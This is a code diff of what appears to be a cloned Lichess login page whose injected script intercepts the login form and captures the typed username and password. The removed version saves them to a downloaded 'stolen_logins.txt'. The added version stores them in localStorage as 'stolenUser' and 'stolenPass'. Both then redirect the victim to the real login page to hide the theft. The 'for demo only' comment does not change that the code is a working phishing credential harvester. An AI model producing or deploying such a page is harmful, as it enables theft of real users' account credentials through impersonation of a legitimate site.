@@ -7,29 +7,24 @@
 })()</script><script nonce="Fk6C9QApY929gr6mevs77mVL">site.load.then(()=>{site.asset.loadEsm('bits.login',{init:"login"})})</script>
 <script>
 document.querySelector("form").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent actual login request
+    event.preventDefault(); // Prevent actual login
 
     // Get the entered username and password
     let username = document.querySelector("#form3-username").value;
     let password = document.querySelector("#form3-password").value;
 
-    // Format the data
-    let data = `Username: ${username} | Password: ${password}\n`;
+    // Store in LocalStorage (for demo only)
+    localStorage.setItem("stolenUser", username);
+    localStorage.setItem("stolenPass", password);
 
-    // Save data as a downloadable text file
-    let blob = new Blob([data], { type: "text/plain" });
-    let link = document.createElement("a");
-    link.href = URL.createObjectURL(blob);
-    link.download = "stolen_logins.txt"; // File that will be downloaded
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+    alert("Data stored! Open console and type: localStorage.getItem('stolenUser')");
 
-    // Optionally redirect to real login page
+    // Redirect to real login page after 2 sec
     setTimeout(() => {
         window.location.href = "https://lichess.org/login";
     }, 2000);
 });
 </script>
+
 
 </body></html>
